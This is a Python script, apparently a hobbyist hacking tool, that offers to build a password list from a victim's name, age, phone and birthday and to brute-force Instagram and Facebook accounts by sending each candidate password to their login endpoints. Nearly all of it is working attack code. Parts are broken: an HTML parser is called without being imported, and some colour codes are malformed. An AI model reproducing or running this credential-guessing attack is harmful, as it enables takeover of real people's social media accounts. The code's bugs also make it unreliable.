import requests
import os
import sys
import time
import random
os.system('clear')
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
A = '\x1b[2;34m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'

def vx2(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)

def vx(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

vx2(B + '\n\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀\n')
vx('             \x1b[1;33m==================================')
vx('\x1b[1;33m             |\x1b[2;34m[+] Developed : \x1b[2;36 _CYBER SOJIB     \x1b[1;33m|')
vx('\x1b[1;33m             |\x1b[2;34m[+] Github    : \x1b[2;36 _Cybersojib12 \x1b[1;33m|')
vx('             \x1b[1;33m==================================\n\n')
vx('\x1b[2;36m(\x1b[1;33m1-\x1b[2;36m) \x1b[1;34mMake Password')
vx('\x1b[2;36m(\x1b[1;33m2-\x1b[2;36m) \x1b[1;34mHack Instagram')
vx('\x1b[2;36m(\x1b[1;33m3-\x1b[2;36m) \x1b[1;34mHack Facebook\n')

key = input(B + '\x1b[2;36m[\x1b[1;33m~\x1b[2;36m] \x1b[2;36mEnter Your Choice: ' + Z)

if key == '1':
    username = input(B + 'Enter Victim Name: ' + X).replace(' ', '')
    nek_name = input(B + 'Enter Victim Nickname: ' + X).replace(' ', '')
    age = input(B + 'Enter Victim Age: ' + X).replace(' ', '')
    phone = input(B + 'Enter Victim Phone Number: ' + X).replace(' ', '')
    birthday = input(B + 'Enter Victim Birthday: ' + X).replace(' ', '')

    user_info = f'{username}{age}{nek_name}{phone}{birthday}_'
    num_0 = int(input(Y + 'Enter Number of Lines for Password List: ' + Z))
    passwords = [''.join(random.choices(user_info, k=12)) for _ in range(num_0)]

    with open('passran.txt', 'w') as file:
        for password in passwords:
            file.write(f'{password}\n')

    print(f'\n{F}Passwords saved in \'passran.txt\'')

elif key == '2':
    r = requests.Session()
    file = input('\x1b[2;36m[\x1b[1;33m~\x1b[2;36m] Enter Password List (passran.txt): ' + Z)
    with open(file, 'r') as rfile:
        us = input('\x1b[2;36m[\x1b[1;33m~\x1b[2;36m] Enter Victim Username: ' + Z)
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'x-requested-with': 'XMLHttpRequest'}

        for password in rfile:
            password = password.strip()
            data = {
                'username': us,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            req_login = r.post(url, headers=headers, data=data)

            if 'userId' in req_login.text:
                print(f'{F}Successfully Logged In! Username: {us}, Password: {password}')
                break
            else:
                print(f'{Z}Incorrect password: {password}')

elif key == '3':
    def login(username, password):
        req = requests.Session()
        response = req.get('https://m.facebook.com/login.php')
        soup = bs(response.text, 'html.parser')

        data = {
            'lsd': soup.find('input', {'name': 'lsd'})['value'],
            'jazoest': soup.find('input', {'name': 'jazoest'})['value'],
            'email': username,
            'pass': password,
            'login': 'submit'
        }

        response = req.post('https://m.facebook.com/login.php', data=data)
        if 'c_user' in req.cookies.get_dict():
            print(f'{F}Successfully Logged In! Username: {username}, Password: {password}')
        else:
            print(f'{Z}Incorrect password: {password}')

    username = input(B + 'Enter Victim Email: ' + X)
    file_path = input(B + 'Enter Password List (passran.txt): ' + X)
    
    with open(file_path, 'r') as file:
        for password in file:
            login(username, password.strip())

else:
    print(Z + 'Invalid option selected.')

    
